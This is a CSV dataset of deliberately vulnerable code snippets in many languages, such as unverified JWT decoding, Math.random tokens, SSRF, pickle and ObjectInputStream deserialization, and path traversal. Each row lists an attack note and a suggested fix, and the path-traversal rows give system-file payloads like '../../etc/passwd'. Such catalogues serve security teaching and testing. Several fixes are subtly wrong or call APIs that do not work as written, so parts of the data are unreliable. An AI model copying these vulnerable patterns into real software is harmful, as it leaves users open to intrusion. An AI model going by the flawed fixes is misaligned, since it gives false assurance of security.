vuln-405,Perl,Insecure Session Timeout,No session cookie expiration.,"$r->headers_out->set('Set-Cookie' => ""session=$id"");",Persistent session attacks.,"Set: $r->headers_out->set('Set-Cookie' => ""session=$id; Max-Age=3600"")","$r->headers_out->set('Set-Cookie' => ""session=$id"");",False,False,False,False,52,False,True,False,Authentication,1
vuln-406,Node.js,Insecure JWT Handling,Accepting unverified JWT tokens.,const payload = jwt.decode(token);,Forge tokens without signature verification.,"Use: jwt.verify(token, secret, { algorithms: ['HS256'] })",const payload = jwt.decode(token);,False,False,False,False,34,False,False,False,Other,1
vuln-407,Python,Insecure JWT Handling,No JWT signature verification.,"payload = jwt.decode(token, options={'verify_signature': False})",Craft malicious JWTs to bypass auth.,"Verify: jwt.decode(token, key=secret, algorithms=['HS256'])","payload = jwt.decode(token, options={'verify_signature': False})",False,False,False,False,64,False,True,False,Other,1
vuln-408,Java,Insecure JWT Handling,Parsing JWT without verification.,JWT jwt = JWTParser.parse(token);,Inject forged JWTs.,Use: Jwts.parser().setSigningKey(key).parseClaimsJws(token),JWT jwt = JWTParser.parse(token);,False,False,False,False,33,False,False,False,Other,1
vuln-409,PHP,Insecure JWT Handling,No JWT signature validation.,"$payload = JWT::decode($token, null, false);",Forge tokens to impersonate users.,"Verify: JWT::decode($token, $key, ['HS256'])","$payload = JWT::decode($token, null, false);",False,False,False,False,44,False,False,False,Other,1
vuln-410,Ruby,Insecure JWT Handling,Decoding JWT without verification.,"payload = JWT.decode(token, nil, false)",Craft malicious JWTs.,"Verify: JWT.decode(token, secret, true, algorithm: 'HS256')","payload = JWT.decode(token, nil, false)",False,False,False,False,39,False,False,False,Other,1
vuln-411,Go,Insecure JWT Handling,Parsing JWT without validation.,"token, _ := jwt.Parse(tokenString, nil)",Forge tokens to bypass auth.,"Verify: jwt.Parse(tokenString, func(token *jwt.Token) (interface{}, error) { return key, nil })","token, _ := jwt.Parse(tokenString, nil)",False,False,False,False,39,False,False,False,Other,1
vuln-412,C# (.NET),Insecure JWT Handling,No JWT signature verification.,var payload = JwtSecurityTokenHandler().ReadJwtToken(token);,Inject forged JWTs.,"Validate: new JwtSecurityTokenHandler().ValidateToken(token, validationParameters, out _)",var payload = JwtSecurityTokenHandler().ReadJwtToken(token);,False,False,False,False,60,False,False,False,Other,1
vuln-413,Kotlin,Insecure JWT Handling,Parsing JWT without verification.,val jwt = JWT.decode(token),Craft malicious JWTs.,Verify: JWT.require(Algorithm.HMAC256(secret)).build().verify(token),val jwt = JWT.decode(token),False,False,False,False,27,False,False,False,Other,1
vuln-414,Scala,Insecure JWT Handling,No JWT signature validation.,val payload = JWT.decode(token),Forge tokens to impersonate users.,Verify: JWT.require(Algorithm.HMAC256(secret)).build.verify(token),val payload = JWT.decode(token),False,False,False,False,31,False,False,False,Other,1
vuln-415,Rust,Insecure JWT Handling,Parsing JWT without validation.,let claims = jsonwebtoken::decode_header(&token)?;,Inject forged JWTs.,"Verify: jsonwebtoken::decode(&token, &DecodingKey::from_secret(secret.as_ref()), &Validation::new(Algorithm::HS256))",let claims = jsonwebtoken::decode_header(&token)?;,False,False,False,False,50,False,False,False,Other,1
vuln-416,Elixir,Insecure JWT Handling,No JWT signature verification.,"{:ok, payload, _} = Joken.peek(token)",Craft malicious JWTs.,"Verify: Joken.verify_and_validate(config, token)","{:ok, payload, _} = Joken.peek(token)",False,False,False,False,37,False,False,False,Other,1
vuln-417,Perl,Insecure JWT Handling,Decoding JWT without verification.,"my $payload = decode_jwt($token, undef, 0);",Forge tokens to bypass auth.,"Verify: decode_jwt($token, $secret, 1)","my $payload = decode_jwt($token, undef, 0);",False,False,False,False,43,False,False,False,Other,1
vuln-418,Node.js,Weak Random Number Generation,Using Math.random for security-sensitive operations.,const token = Math.random().toString(36).substring(2);,Predict random values for token guessing.,Use crypto.randomBytes(16).toString('hex'),const token = Math.random().toString(36).substring(2);,False,False,False,False,54,False,False,False,Other,1
vuln-419,Python,Weak Random Number Generation,Using random module for cryptographic purposes.,"import random; token = ''.join(random.choices('abcdef0123456789', k=16))",Predict tokens due to weak PRNG.,Use secrets.token_hex(16),"import random; token = ''.join(random.choices('abcdef0123456789', k=16))",False,False,False,False,72,False,True,False,Other,1
vuln-420,Java,Weak Random Number Generation,Using Random instead of SecureRandom.,Random rand = new Random(); String token = String.valueOf(rand.nextLong());,Predict random values.,Use SecureRandom: new SecureRandom().nextBytes(bytes),Random rand = new Random(); String token = String.valueOf(rand.nextLong());,False,False,False,False,75,False,False,False,Other,1
vuln-421,PHP,Weak Random Number Generation,Using rand() for security tokens.,"$token = substr(str_shuffle('abcdef0123456789'), 0, 16);",Predict tokens due to weak randomness.,Use random_bytes(16) and bin2hex,"$token = substr(str_shuffle('abcdef0123456789'), 0, 16);",False,False,False,False,56,False,True,False,Other,1
vuln-422,Ruby,Weak Random Number Generation,Using rand for cryptographic tokens.,token = (0...16).map { ('a'..'z').to_a[rand(26)] }.join,Predict random tokens.,Use SecureRandom.hex(16),token = (0...16).map { ('a'..'z').to_a[rand(26)] }.join,False,False,False,False,55,False,True,False,Other,1
vuln-423,Go,Weak Random Number Generation,Using math/rand for security purposes.,rand.Seed(time.Now().UnixNano()); token := rand.Int63(),Predict values based on seed.,Use crypto/rand: crypto.Read(bytes),rand.Seed(time.Now().UnixNano()); token := rand.Int63(),False,False,False,False,55,False,False,False,Other,1
vuln-424,C# (.NET),Weak Random Number Generation,Using Random for cryptographic tokens.,var rand = new Random(); var token = rand.Next().ToString();,Predict random values.,Use RNGCryptoServiceProvider: GetBytes(bytes),var rand = new Random(); var token = rand.Next().ToString();,False,False,False,False,60,False,False,False,Other,1
vuln-425,Kotlin,Weak Random Number Generation,Using Random for security tokens.,val token = Random().nextLong().toString(),Predict tokens due to weak PRNG.,Use SecureRandom: SecureRandom().nextBytes(bytes),val token = Random().nextLong().toString(),False,False,False,False,42,False,False,False,Other,1
vuln-426,Scala,Weak Random Number Generation,Using scala.util.Random for crypto.,val token = scala.util.Random.nextString(16),Predict random values.,Use SecureRandom: java.security.SecureRandom,val token = scala.util.Random.nextString(16),False,False,False,False,44,False,False,False,Other,1
vuln-427,Rust,Weak Random Number Generation,Using rand::thread_rng for crypto.,let token = thread_rng().gen::<u64>().to_string();,Predict values from weak PRNG.,Use rand::crypto::SystemRandom,let token = thread_rng().gen::<u64>().to_string();,False,False,False,False,50,False,False,False,Other,1
vuln-428,Elixir,Weak Random Number Generation,Using :rand for cryptographic tokens.,token = :rand.uniform(1_000_000_000) |> Integer.to_string(),Predict random tokens.,Use :crypto.strong_rand_bytes(16) |> Base.encode16(),token = :rand.uniform(1_000_000_000) |> Integer.to_string(),False,False,False,False,59,False,False,False,Other,1
vuln-429,Perl,Weak Random Number Generation,Using rand for security tokens.,"my $token = join '', map { ('a'..'z')[rand 26] } 1..16;",Predict random values.,Use Crypt::Random::Source for secure randomness.,"my $token = join '', map { ('a'..'z')[rand 26] } 1..16;",False,False,False,False,55,False,True,False,Other,1
vuln-430,Node.js,Insecure Cookie Flags,Cookies missing Secure and HttpOnly flags.,"res.cookie('session', token);",Steal cookies via XSS or MITM.,"Set: res.cookie('session', token, { secure: true, httpOnly: true })","res.cookie('session', token);",False,False,False,False,29,False,True,False,Other,1
vuln-431,Python,Insecure Cookie Flags,Cookies without Secure or HttpOnly.,"response.set_cookie('session', token)",Access cookies via XSS or insecure HTTP.,"Set: response.set_cookie('session', token, secure=True, httponly=True)","response.set_cookie('session', token)",False,False,False,False,37,False,True,False,Other,1
vuln-432,Java,Insecure Cookie Flags,Cookies missing security flags.,"Cookie cookie = new Cookie(""session"", token); response.addCookie(cookie);",Steal cookies via XSS or MITM.,Set: cookie.setSecure(true); cookie.setHttpOnly(true);,"Cookie cookie = new Cookie(""session"", token); response.addCookie(cookie);",False,False,False,False,73,False,True,False,Other,1
vuln-433,PHP,Insecure Cookie Flags,Cookies without Secure or HttpOnly.,"setcookie('session', $token);",Steal cookies via XSS or HTTP.,"Set: setcookie('session', $token, ['secure' => true, 'httponly' => true]);","setcookie('session', $token);",False,False,False,False,29,False,True,False,Other,1
vuln-434,Ruby,Insecure Cookie Flags,Cookies missing security flags.,cookies[:session] = token,Access cookies via XSS or MITM.,"Set: cookies[:session] = { value: token, secure: true, httponly: true }",cookies[:session] = token,False,False,False,False,25,False,False,False,Other,1
vuln-435,Go,Insecure Cookie Flags,Cookies without Secure or HttpOnly.,"http.SetCookie(w, &http.Cookie{Name: ""session"", Value: token})",Steal cookies via XSS or HTTP.,"Set: &http.Cookie{Name: ""session"", Value: token, Secure: true, HttpOnly: true}","http.SetCookie(w, &http.Cookie{Name: ""session"", Value: token})",False,False,False,False,62,False,True,False,Other,1
vuln-436,C# (.NET),Insecure Cookie Flags,Cookies missing security flags.,"Response.Cookies.Append(""session"", token);",Steal via XSS or insecure HTTP.,"Set: Response.Cookies.Append(""session"", token, new CookieOptions { Secure = true, HttpOnly = true });","Response.Cookies.Append(""session"", token);",False,False,False,False,42,False,True,False,Other,1
vuln-437,Kotlin,Insecure Cookie Flags,Cookies without Secure or HttpOnly.,"call.response.cookies.append(""session"", token)",Access cookies via XSS or MITM.,"Set: call.response.cookies.append(Cookie(""session"", token, secure = true, httpOnly = true))","call.response.cookies.append(""session"", token)",False,False,False,False,46,False,True,False,Other,1
vuln-438,Scala,Insecure Cookie Flags,Cookies missing security flags.,"Ok.withCookies(Cookie(""session"", token))",Steal cookies via XSS or HTTP.,"Set: Cookie(""session"", token, secure = true, httpOnly = true)","Ok.withCookies(Cookie(""session"", token))",False,False,False,False,40,False,True,False,Other,1
vuln-439,Rust,Insecure Cookie Flags,Cookies without Secure or HttpOnly.,"res.cookie(Cookie::new(""session"", token))",Access cookies via XSS or MITM.,"Set: Cookie::new_with_attributes(""session"", token, { secure: true, http_only: true })","res.cookie(Cookie::new(""session"", token))",False,False,False,False,41,False,True,False,Other,1
vuln-440,Elixir,Insecure Cookie Flags,Cookies missing security flags.,"put_resp_cookie(conn, ""session"", token)",Steal cookies via XSS or HTTP.,"Set: put_resp_cookie(conn, ""session"", token, secure: true, http_only: true)","put_resp_cookie(conn, ""session"", token)",False,False,False,False,39,False,True,False,Other,1
vuln-441,Perl,Insecure Cookie Flags,Cookies without Secure or HttpOnly.,"$r->headers_out->set('Set-Cookie' => ""session=$token"");",Steal via XSS or insecure HTTP.,"Set: $r->headers_out->set('Set-Cookie' => ""session=$token; Secure; HttpOnly"")","$r->headers_out->set('Set-Cookie' => ""session=$token"");",False,False,False,False,55,False,True,False,Other,1
vuln-443,Python,Server-Side Request Forgery,Fetching unvalidated URLs.,response = requests.get(request.args.get('url')),Request internal endpoints like http://127.0.0.1.,Validate: if urlparse(url).hostname in ALLOWED_HOSTS: requests.get(url),response = requests.get(request.args.get('url')),False,False,False,False,48,False,True,False,Other,1
vuln-444,Java,Server-Side Request Forgery,Unvalidated URL fetching.,"URL url = new URL(request.getParameter(""url"")); url.openConnection().getInputStream();",Access internal APIs or localhost.,Whitelist: if (ALLOWED_HOSTS.contains(url.getHost())) url.openConnection(),"URL url = new URL(request.getParameter(""url"")); url.openConnection().getInputStream();",True,False,True,False,86,False,True,False,Other,1
vuln-445,PHP,Server-Side Request Forgery,Fetching unvalidated URLs.,file_get_contents($_GET['url']);,Request internal resources: http://localhost.,"Validate: if (in_array(parse_url($url, PHP_URL_HOST), $allowed)) file_get_contents($url)",file_get_contents($_GET['url']);,False,False,False,False,32,False,True,False,Other,1
vuln-446,Ruby,Server-Side Request Forgery,Unvalidated URL requests.,response = Net::HTTP.get(URI(params[:url])),Access internal endpoints.,Validate: Net::HTTP.get(URI(url)) if ALLOWED_HOSTS.include?(URI(url).host),response = Net::HTTP.get(URI(params[:url])),True,False,False,False,43,False,False,False,Other,1
vuln-447,Go,Server-Side Request Forgery,Fetching unvalidated URLs.,"resp, _ := http.Get(r.URL.Query().Get(""url""))",Request internal services like http://127.0.0.1.,"Validate: if strings.HasPrefix(url, ""https://allowed.com"") { http.Get(url) }","resp, _ := http.Get(r.URL.Query().Get(""url""))",True,True,False,False,45,False,True,False,Other,1
vuln-448,C# (.NET),Server-Side Request Forgery,Unvalidated URL fetching.,"var response = await new HttpClient().GetAsync(Request.Query[""url""]);",Access internal APIs.,Validate: if (ALLOWED_HOSTS.Contains(new Uri(url).Host)) await client.GetAsync(url),"var response = await new HttpClient().GetAsync(Request.Query[""url""]);",True,True,False,False,69,False,True,False,Other,1
vuln-449,Kotlin,Server-Side Request Forgery,Fetching unvalidated URLs.,"val response = URL(call.request.queryParameters[""url""]).readText()",Request internal endpoints.,Validate: if (url.host in ALLOWED_HOSTS) URL(url).readText(),"val response = URL(call.request.queryParameters[""url""]).readText()",True,True,False,False,66,False,True,False,Other,1
vuln-450,Scala,Server-Side Request Forgery,Unvalidated URL requests.,"val response = scala.io.Source.fromURL(params(""url"")).mkString",Access internal services.,Validate: if (ALLOWED_HOSTS.contains(new URL(url).getHost)) Source.fromURL(url),"val response = scala.io.Source.fromURL(params(""url"")).mkString",True,False,False,False,62,False,True,False,Other,1
vuln-451,Rust,Server-Side Request Forgery,Fetching unvalidated URLs.,"let resp = reqwest::get(&req.query(""url"")?).await?;",Request internal resources.,"Validate: if url.starts_with(""https://allowed.com"") { reqwest::get(url) }","let resp = reqwest::get(&req.query(""url"")?).await?;",True,True,False,False,51,False,True,False,Other,1
vuln-452,Elixir,Server-Side Request Forgery,Unvalidated URL fetching.,"{:ok, _} = HTTPoison.get(params[""url""])",Access internal endpoints.,"Validate: if String.starts_with?(url, ""https://allowed.com"") do HTTPoison.get(url) end","{:ok, _} = HTTPoison.get(params[""url""])",True,False,False,False,39,False,True,False,Other,1
vuln-453,Perl,Server-Side Request Forgery,Fetching unvalidated URLs.,my $response = LWP::UserAgent->new->get($r->param('url'));,Request internal services.,Validate: $ua->get($url) if grep { $url =~ /^$_/ } @allowed;,my $response = LWP::UserAgent->new->get($r->param('url'));,True,False,False,False,58,False,True,False,Other,1
vuln-454,Node.js,Insecure Deserialization,Deserializing untrusted data with node-serialize.,const serialize = require('node-serialize'); serialize.unserialize(userInput);,Inject malicious serialized objects for RCE.,Avoid deserialization; use JSON.parse with validation.,const serialize = require(); serialize.unserialize(userInput);,True,False,False,False,78,False,True,False,Other,1
vuln-455,Python,Insecure Deserialization,Using pickle for untrusted data.,import pickle; obj = pickle.loads(request.data),Craft pickle payload for RCE.,Use JSON or YAML.safe_load; avoid pickle.,import pickle; obj = pickle.loads(request.data),False,False,False,False,47,False,False,False,Other,1
vuln-456,Java,Insecure Deserialization,Deserializing untrusted data with ObjectInputStream.,ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data)); ois.readObject();,Inject gadget chains for RCE.,Use ObjectInputFilter; whitelist classes.,ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data)); ois.readObject();,True,False,False,False,96,False,False,False,Other,1
vuln-457,PHP,Insecure Deserialization,Unserializing untrusted data.,$obj = unserialize($_POST['data']);,Inject malicious serialized objects.,Avoid unserialize; use JSON or safe formats.,$obj = unserialize($_POST['data']);,False,False,False,False,35,False,True,False,Other,1
vuln-458,Ruby,Insecure Deserialization,Using Marshal.load on untrusted data.,obj = Marshal.load(user_input),Craft malicious payload for RCE.,Use JSON; avoid Marshal.load on user input.,obj = Marshal.load(user_input),True,False,False,False,30,False,False,False,Other,1
vuln-459,Go,Insecure Deserialization,Decoding untrusted gob data.,decoder := gob.NewDecoder(bytes.NewReader(data)); decoder.Decode(&obj);,Inject malicious gob data.,Use JSON or safe formats; avoid gob for user input.,decoder := gob.NewDecoder(bytes.NewReader(data)); decoder.Decode(&obj);,False,False,False,False,71,False,False,False,Other,1
vuln-460,C# (.NET),Insecure Deserialization,Using BinaryFormatter on untrusted data.,BinaryFormatter bf = new BinaryFormatter(); bf.Deserialize(stream);,Inject malicious serialized objects.,Use JsonSerializer; avoid BinaryFormatter.,BinaryFormatter bf = new BinaryFormatter(); bf.Deserialize(stream);,False,False,False,False,67,False,False,False,Other,1
vuln-461,Kotlin,Insecure Deserialization,Deserializing untrusted data.,val ois = ObjectInputStream(ByteArrayInputStream(data)); val obj = ois.readObject(),Craft malicious objects for RCE.,Use JSON or safe formats; avoid ObjectInputStream.,val ois = ObjectInputStream(ByteArrayInputStream(data)); val obj = ois.readObject(),True,False,False,False,83,False,False,False,Other,1
vuln-462,Scala,Insecure Deserialization,Deserializing untrusted Java objects.,val ois = new ObjectInputStream(new ByteArrayInputStream(data)); ois.readObject(),Inject gadget chains for RCE.,Use JSON; avoid ObjectInputStream for user data.,val ois = new ObjectInputStream(new ByteArrayInputStream(data)); ois.readObject(),True,False,False,False,81,False,False,False,Other,1
vuln-463,Rust,Insecure Deserialization,Using serde with untrusted data.,let obj: T = serde_json::from_str(&user_input)?;,Inject malicious JSON to manipulate structs.,Validate JSON schema; use strict typing.,let obj: T = serde_json::from_str(&user_input)?;,True,False,False,False,48,False,False,False,Other,1
vuln-464,Elixir,Insecure Deserialization,Using :erlang.binary_to_term on untrusted data.,obj = :erlang.binary_to_term(user_input),Craft malicious terms for RCE.,Use Jason.decode!; avoid binary_to_term.,obj = :erlang.binary_to_term(user_input),True,False,False,False,40,False,False,False,Other,1
vuln-465,Perl,Insecure Deserialization,Using Storable::thaw on untrusted data.,use Storable qw(thaw); my $obj = thaw($user_input);,Inject malicious serialized data.,Use JSON::XS; avoid Storable for user input.,use Storable qw(thaw); my $obj = thaw($user_input);,True,False,False,False,51,False,False,False,Other,1
vuln-466,Node.js,Insecure GraphQL Introspection,Exposing GraphQL introspection queries.,"const schema = buildSchema(typeDefs); app.use('/graphql', graphqlHTTP({ schema }));",Query schema to map API and craft attacks.,"Disable introspection: graphqlHTTP({ schema, introspection: false })","const schema = buildSchema(typeDefs); app.use('/graphql', graphqlHTTP({ schema }));",False,False,False,False,83,False,True,False,Other,1
vuln-467,Python,Insecure GraphQL Introspection,Allowing GraphQL introspection.,"schema = graphene.Schema(query=Query); app.add_url_rule('/graphql', view_func=GraphQLView.as_view('graphql', schema=schema))",Extract schema to plan attacks.,"Disable introspection: schema = graphene.Schema(query=Query, auto_camelcase=False, introspection=False)","schema = graphene.Schema(query=Query); app.add_url_rule('/graphql', view_func=GraphQLView.as_view('graphql', schema=schema))",True,True,False,False,124,False,True,False,Other,1
vuln-468,Java,Insecure GraphQL Introspection,Exposing GraphQL schema introspection.,@GraphQLApi public class GraphQLController { @GraphQLQuery public DataFetcher<?> query() { ... } },Query schema to discover endpoints.,Disable introspection in GraphQL configuration.,@GraphQLApi public class GraphQLController { @GraphQLQuery public DataFetcher<?> query() { ... } },True,True,False,False,98,False,False,False,Other,1
vuln-469,PHP,Insecure GraphQL Introspection,Allowing GraphQL introspection queries.,"$schema = new Schema(['query' => $queryType]); $result = GraphQL::executeQuery($schema, $request->query);",Map schema to craft targeted queries.,Disable introspection: $schema->disableIntrospection(),"$schema = new Schema(['query' => $queryType]); $result = GraphQL::executeQuery($schema, $request->query);",True,True,False,True,105,False,True,False,Other,1
vuln-470,Ruby,Insecure GraphQL Introspection,Exposing GraphQL introspection.,class MySchema < GraphQL::Schema; query Types::Query; end,Query schema to extract API details.,Disable: class MySchema < GraphQL::Schema; query Types::Query; introspection false; end,class MySchema < GraphQL::Schema; query Types::Query; end,True,True,False,False,57,False,False,False,Other,1
vuln-471,Go,Insecure GraphQL Introspection,Allowing GraphQL introspection.,"schema, _ := graphql.NewSchema(graphql.SchemaConfig{Query: queryType})",Extract schema to plan attacks.,Disable introspection in gqlgen configuration.,"schema, _ := graphql.NewSchema(graphql.SchemaConfig{Query: queryType})",True,True,False,False,70,False,False,False,Other,1
vuln-472,C# (.NET),Insecure GraphQL Introspection,Exposing GraphQL introspection.,services.AddGraphQL().AddSchema<MySchema>();,Query schema to map API.,Disable: AddGraphQL().AddSchema<MySchema>().DisableIntrospection(),services.AddGraphQL().AddSchema<MySchema>();,False,False,False,False,44,False,False,False,Other,1
vuln-473,Kotlin,Insecure GraphQL Introspection,Allowing GraphQL introspection queries.,graphql { schema { query = Query::class } },Extract schema for attack planning.,Disable introspection in GraphQL-Kotlin config.,graphql { schema { query = Query::class } },True,True,False,False,43,False,False,False,Other,1
vuln-474,Scala,Insecure GraphQL Introspection,Exposing GraphQL introspection.,"SchemaDefinition(queries = List(Field(""query"", ...)))",Query schema to discover endpoints.,Disable introspection in Sangria configuration.,"SchemaDefinition(queries = List(Field(""query"", ...)))",True,True,False,False,53,False,True,False,Other,1
vuln-475,Rust,Insecure GraphQL Introspection,Allowing GraphQL introspection.,"let schema = Schema::build(Query, EmptyMutation, EmptySubscription).finish();",Map schema to craft attacks.,Disable introspection in Juniper configuration.,"let schema = Schema::build(Query, EmptyMutation, EmptySubscription).finish();",True,True,False,False,77,False,False,False,Other,1
vuln-476,Elixir,Insecure GraphQL Introspection,Exposing GraphQL introspection.,schema do query do ... end end,Query schema to extract API details.,Disable: Absinthe.Schema.introspection(false),schema do query do ... end end,True,True,False,False,30,False,False,False,Other,1
vuln-477,Perl,Insecure GraphQL Introspection,Allowing GraphQL introspection queries.,my $schema = GraphQL::Schema->new(query => $query);,Extract schema to plan attacks.,Disable introspection in GraphQL::Perl config.,my $schema = GraphQL::Schema->new(query => $query);,True,True,False,False,51,False,False,False,Other,1
vuln-478,Node.js,Path Traversal,Unvalidated file path access.,"fs.readFileSync(path.join('public', req.query.file))",Access: ../../etc/passwd,"Validate: path.resolve('public', file).startsWith(process.cwd() + '/public')","fs.readFileSync(path.join('public', req.query.file))",True,True,True,False,52,False,True,False,File_Handling,1
vuln-479,Python,Path Traversal,Unvalidated file path in file read.,"with open(os.path.join('public', request.args.get('file'))) as f: return f.read()",Access: ../../etc/passwd,Validate: os.path.realpath(path).startswith(os.path.realpath('public')),"with open(os.path.join('public', request.args.get('file'))) as f: return f.read()",False,False,True,False,81,False,True,False,File_Handling,1
vuln-480,Java,Path Traversal,Unvalidated file path access.,"Files.readString(Paths.get(""public"", request.getParameter(""file"")));",Access: ../../etc/passwd,"Validate: Paths.get('public', file).normalize().startsWith(Paths.get('public'))","Files.readString(Paths.get(""public"", request.getParameter(""file"")));",True,False,False,False,68,False,True,False,File_Handling,1
vuln-481,PHP,Path Traversal,Unvalidated file path in read.,readfile('public/' . $_GET['file']);,Access: ../../etc/passwd,Validate: realpath('public/' . $file) starts with base dir.,readfile('public/' . $_GET['file']);,False,False,True,False,36,False,True,False,File_Handling,1
vuln-482,Ruby,Path Traversal,Unvalidated file path access.,"File.read(File.join('public', params[:file]))",Access: ../../etc/passwd,"Validate: File.expand_path(file, 'public').start_with?(Dir.pwd + '/public')","File.read(File.join('public', params[:file]))",True,False,False,False,45,False,True,False,File_Handling,1
vuln-483,Go,Path Traversal,Unvalidated file path in read.,"data, _ := os.ReadFile(filepath.Join(""public"", r.URL.Query().Get(""file"")))",Access: ../../etc/passwd,"Validate: filepath.Clean(path).HasPrefix(""public"")","data, _ := os.ReadFile(filepath.Join(""public"", r.URL.Query().Get(""file"")))",True,True,True,False,74,False,True,False,File_Handling,1
vuln-484,C# (.NET),Path Traversal,Unvalidated file path access.,"File.ReadAllText(Path.Combine(""public"", Request.Query[""file""]))",Access: ../../web.config,"Validate: Path.GetFullPath(path).StartsWith(Path.GetFullPath(""public""))","File.ReadAllText(Path.Combine(""public"", Request.Query[""file""]))",True,True,False,False,63,False,True,False,File_Handling,1
vuln-485,Kotlin,Path Traversal,Unvalidated file path in read.,"File(""public/${call.request.queryParameters[""file""]}"").readText()",Access: ../../etc/passwd,"Validate: File(baseDir, file).canonicalPath.startsWith(baseDir.canonicalPath)","File(""public/${call.request.queryParameters[""file""]}"").readText()",True,True,False,False,65,False,True,True,File_Handling,1
vuln-486,Scala,Path Traversal,Unvalidated file path access.,"scala.io.Source.fromFile(s""public/${params(""file"")}"").mkString",Access: ../../etc/passwd,"Validate: new File(baseDir, file).getCanonicalPath.startsWith(baseDir)","scala.io.Source.fromFile(s""public/${params(""file"")}"").mkString",True,False,False,False,62,False,True,True,File_Handling,1
vuln-487,Rust,Path Traversal,Unvalidated file path in read.,"fs::read_to_string(Path::new(""public"").join(req.query(""file"")?))?",Access: ../../etc/passwd,"Validate: path.canonicalize()?.starts_with(Path::new(""public"").canonicalize()?)","fs::read_to_string(Path::new(""public"").join(req.query(""file"")?))?",True,True,False,False,65,False,True,False,File_Handling,1
vuln-488,Elixir,Path Traversal,Unvalidated file path access.,"File.read!(""public/"" <> params[""file""])",Access: ../../etc/passwd,"Validate: Path.expand(file, ""public"") |> String.starts_with?(""public"")","File.read!(""public/"" <> params[""file""])",True,False,False,False,39,False,True,False,File_Handling,1
vuln-489,Perl,Path Traversal,Unvalidated file path in read.,"open(my $fh, '<', ""public/$filename"");",Access: ../../etc/passwd,"Validate: realpath(""public/$filename"") =~ /^$base_dir/","open(my $fh, '<', ""public/$filename"");",False,False,True,False,38,False,True,False,File_Handling,1
vuln-490,Node.js,Insecure Rate Limiting,No rate limiting on sensitive endpoints.,"app.post('/login', (req, res) => authenticate(req.body));",Brute force login attempts.,"Use express-rate-limit: app.use(rateLimit({ windowMs: 15 * 60 * 1000, max: 5 }))","app.post('/login', (req, res) => authenticate(req.body));",True,False,False,False,57,False,True,False,Other,1
vuln-491,Python,Insecure Rate Limiting,No rate limiting on authentication.,"@app.route('/login', methods=['POST']) def login(): authenticate(request.form)",Brute force credentials.,"Use Flask-Limiter: limiter.limit(""5 per minute"")(login)","@app.route('/login', methods=['POST']) def login(): authenticate(request.form)",False,False,False,False,78,False,True,False,Other,1
vuln-492,Java,Insecure Rate Limiting,No rate limiting on login endpoint.,"@PostMapping(""/login"") public Response login(@RequestBody Credentials creds) { ... }",Brute force login attempts.,Use Spring Security rate limiting or custom filter.,"@PostMapping(""/login"") public Response login(@RequestBody Credentials creds) { ... }",True,False,False,False,84,False,True,False,Other,1
vuln-493,PHP,Insecure Rate Limiting,No rate limiting on sensitive routes.,if ($_SERVER['REQUEST_METHOD'] === 'POST' && $_SERVER['REQUEST_URI'] === '/login') { authenticate($_POST); },Brute force credentials.,Use rate limiting middleware like throttle.,if ($_SERVER['REQUEST_METHOD'] === 'POST' && $_SERVER['REQUEST_URI'] === '/login') { authenticate($_POST); },False,False,False,False,108,False,True,False,Other,1
vuln-494,Ruby,Insecure Rate Limiting,No rate limiting on authentication.,post '/login' do authenticate(params) end,Brute force login attempts.,"Use rack-attack: Rack::Attack.throttle('logins/ip', limit: 5, period: 60)",post '/login' do authenticate(params) end,True,False,False,False,41,False,True,False,Other,1
vuln-495,Go,Insecure Rate Limiting,No rate limiting on login endpoint.,"http.HandleFunc(""/login"", func(w http.ResponseWriter, r *http.Request) { authenticate(r) })",Brute force credentials.,Use rate limiter: github.com/ulule/limiter,"http.HandleFunc(""/login"", func(w http.ResponseWriter, r *http.Request) { authenticate(r) })",False,False,False,False,91,False,True,False,Other,1
vuln-496,C# (.NET),Insecure Rate Limiting,No rate limiting on sensitive endpoints.,"[HttpPost(""login"")] public IActionResult Login([FromBody] Credentials creds) { ... }",Brute force login attempts.,Use AspNetCoreRateLimit: services.AddRateLimiting(),"[HttpPost(""login"")] public IActionResult Login([FromBody] Credentials creds) { ... }",True,False,False,False,84,False,True,False,Other,1
vuln-497,Kotlin,Insecure Rate Limiting,No rate limiting on authentication.,"post(""/login"") { authenticate(call.request.receive()) }",Brute force credentials.,Use Ktor rate limiting plugin: install(RateLimit) { limit = 5; period = 60.seconds },"post(""/login"") { authenticate(call.request.receive()) }",False,False,False,False,55,False,True,False,Other,1
vuln-498,Scala,Insecure Rate Limiting,No rate limiting on login endpoint.,"post(""/login"") { authenticate(params.as[Credentials]) }",Brute force login attempts.,"Use Play filters: add RateLimitFilter(limit = 5, window = 60.seconds)","post(""/login"") { authenticate(params.as[Credentials]) }",True,False,False,False,55,False,True,False,Other,1
vuln-499,Rust,Insecure Rate Limiting,No rate limiting on sensitive routes.,"router.post(""/login"", |req| authenticate(req.body()?))",Brute force credentials.,Use actix-web middleware for rate limiting.,"router.post(""/login"", |req| authenticate(req.body()?))",True,False,False,False,54,False,True,False,Other,1
vuln-500,Elixir,Insecure Rate Limiting,No rate limiting on authentication.,"post ""/login"", AuthController, :login",Brute force login attempts.,"Use Plug.RateLimit: plug :rate_limit, max: 5, interval: 60_000","post ""/login"", AuthController, :login",False,False,False,False,37,False,True,False,Other,1
vuln-401,Kotlin,Insecure Session Timeout,No session expiration configured.,sessionConfig { cookie.maxAgeInSeconds = 0 },Steal session cookies for persistent access.,Set timeout: cookie.maxAgeInSeconds = 3600 // 1 hour,sessionConfig { cookie.maxAgeInSeconds = 0 },False,False,False,False,44,False,False,False,Authentication,1
vuln-402,Scala,Insecure Session Timeout,Sessions without expiration.,sessionConfig.withMaxAge(None),Reuse stolen cookies indefinitely.,Set: sessionConfig.withMaxAge(Some(3600.seconds)),sessionConfig.withMaxAge(None),False,False,False,False,30,False,False,False,Authentication,1
vuln-403,Rust,Insecure Session Timeout,No expiration for session cookies.,cookie.set_expires(None);,Persistent session hijacking.,Set: cookie.set_expires(OffsetDateTime::now_utc() + Duration::hours(1)),cookie.set_expires(None);,False,False,False,False,25,False,False,False,Authentication,1
vuln-404,Elixir,Insecure Session Timeout,No session expiration time.,"plug :fetch_session; put_session(conn, :user_id, id)",Steal cookies for indefinite access.,"Set: put_session(conn, :user_id, id, max_age: 3600)","plug :fetch_session; put_session(conn, :user_id, id)",False,False,False,False,52,False,False,False,Authentication,1
